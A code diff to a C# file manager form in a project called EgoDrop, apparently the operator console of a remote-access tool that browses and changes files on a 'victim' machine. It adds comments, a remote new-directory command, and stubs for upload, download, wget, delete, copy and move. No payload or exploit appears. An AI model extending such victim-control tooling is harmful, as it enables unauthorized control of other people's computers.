@@ -15,27 +15,43 @@ namespace EgoDrop
         public clsVictim m_victim { get; set; }
 
         private string m_szInitDir { get; set; }
+        private string m_szCurrentPath { get { return (string)textBox1.Tag; } }
+
+        /// <summary>
+        /// File information struct.
+        /// Store the file information of remote file.
+        /// </summary>
         private struct stFileInfo
         {
-            public bool bDirectory;
-            public string szFilePath;
-            public string szFileName { get { return szFilePath.Split('/').Last(); } }
-            public ulong nFileSize;
-            public string szPermission;
+            public bool bDirectory { get; set; }                                              //Is directory.
+            public string szFilePath { get; set; }                                            //File path.
+            public string szFileName { get { return szFilePath.Split('/').Last(); } }         //File name.
+            public ulong nFileSize { get; set; }                                              //File size(bytes).
+            public string szPermission { get; set; }                                          //File permission(rwx).
 
-            public string szCreationDate;
-            public string szLastModifiedDate;
-            public string szLastAccessedDate;
+            public string szCreationDate { get; set; }                                        //File creation date.
+            public string szLastModifiedDate { get; set; }                                    //File last modified date.
+            public string szLastAccessedDate { get; set; }                                    //File last accessed date.
 
+            /// <summary>
+            /// Constructor.
+            /// </summary>
+            /// <param name="bDirectory">Is directory.</param>
+            /// <param name="szFilePath">File path.</param>
+            /// <param name="nFileSize">File size(bytes).</param>
+            /// <param name="szPermission">File permission(rwx).</param>
+            /// <param name="szCreationDate">File creation date.</param>
+            /// <param name="szLastModifiedDate">File last modified date.</param>
+            /// <param name="szLastAccessedDate">File last accessed date.</param>
             public stFileInfo(
-                bool bDirectory,
-                string szFilePath,
-                ulong nFileSize,
-                string szPermission,
+                bool bDirectory,           //Is directory
+                string szFilePath,         //File path.
+                ulong nFileSize,           //File size(bytes).
+                string szPermission,       //File permission(rwx).
 
-                string szCreationDate,
-                string szLastModifiedDate,
-                string szLastAccessedDate
+                string szCreationDate,     //File creation date.
+                string szLastModifiedDate, //File last modified date.
+                string szLastAccessedDate  //File last accessed date.
             )
             {
                 this.bDirectory = bDirectory;
@@ -100,12 +116,12 @@ namespace EgoDrop
                                 if (string.IsNullOrEmpty(szFileName) || szFileName == "." || szFileName == "..")
                                     continue;
 
-                                bool bDirectory = lFile[0] == "1";
-                                ulong nFileSize = ulong.Parse(lFile[2]);
-                                string szPermission = lFile[3];
-                                string szCreationDate = lFile[4];
-                                string szLastModifiedDate = lFile[5];
-                                string szLastAccessedDate = lFile[6];
+                                bool bDirectory = lFile[0] == "1";                 //Entity is directory.
+                                ulong nFileSize = ulong.Parse(lFile[2]);           //Entity size (bytes).
+                                string szPermission = lFile[3];                    //Entity permission (drwx).
+                                string szCreationDate = lFile[4];                  //Entity creation date.
+                                string szLastModifiedDate = lFile[5];              //Last modified date.
+                                string szLastAccessedDate = lFile[6];              //Last accessed date.
 
                                 stFileInfo file = new stFileInfo(
                                     bDirectory,
@@ -201,29 +217,45 @@ namespace EgoDrop
                             TreeNode tnNode = fnAddTreeNodeByPath(szDirPath);
                             treeView1.SelectedNode = tnNode;
                         }
-                        else if (lsMsg[1] == "uf")
+                        else if (lsMsg[1] == "uf") //Upload file.
                         {
 
                         }
-                        else if (lsMsg[1] == "df")
+                        else if (lsMsg[1] == "df") //Download file
                         {
 
                         }
-                        else if (lsMsg[1] == "wget")
+                        else if (lsMsg[1] == "wget") //WGET
                         {
 
                         }
-                        else if (lsMsg[1] == "del")
+                        else if (lsMsg[1] == "del") //Delete
                         {
 
                         }
-                        else if (lsMsg[1] == "cp")
+                        else if (lsMsg[1] == "cp") //Copy
                         {
 
                         }
-                        else if (lsMsg[1] == "mv")
+                        else if (lsMsg[1] == "mv") //Move
                         {
 
+                        }
+                        else if (lsMsg[1] == "nd") //New directory.
+                        {
+                            string szDirPath = lsMsg[2];
+                            int nCode = int.Parse(lsMsg[3]);
+                            string szMsg = lsMsg[4];
+
+                            if (nCode == 0)
+                            {
+                                clsTools.fnShowErrMsgbox(szMsg, "New Directory");
+                                return;
+                            }
+
+                            TreeNode node = fnFindTreeNodeByPath(m_szCurrentPath, treeView1.Nodes);
+                            treeView1.SelectedNode = null;
+                            treeView1.SelectedNode = node;
                         }
                     }
                 }
@@ -447,6 +479,46 @@ namespace EgoDrop
             }
 
             f.fnSendImageRequest(lsImage);
+        }
+
+        //New Folder
+        private void toolStripMenuItem14_Click(object sender, EventArgs e)
+        {
+            ListViewItem item = new ListViewItem($"Folder_{clsEZData.fnszDateString()}");
+            listView1.Items.Add(item);
+
+            listView1.LabelEdit = true;
+            item.BeginEdit();
+        }
+        //New Text File
+        private void toolStripMenuItem15_Click(object sender, EventArgs e)
+        {
+            frmFileEditor f = new frmFileEditor(m_victim);
+
+            f.Show();
+
+            string szFilePath = $"{m_szCurrentPath}/{clsEZData.fnszDateFileName("txt")}";
+            f.fnAddNewPage(szFilePath, string.Empty);
+        }
+
+        private void listView1_AfterLabelEdit(object sender, LabelEditEventArgs e)
+        {
+            ListViewItem item = listView1.Items[e.Item];
+
+            if (e.Label == null)
+            {
+                listView1.Items.Remove(item);
+                return;
+            }
+
+            m_victim.fnSendCommand(new string[]
+            {
+                "file",
+                "nd",
+                m_szCurrentPath + "/" + item.Text,
+            });
+
+            listView1.LabelEdit = false;
         }
     }
 }
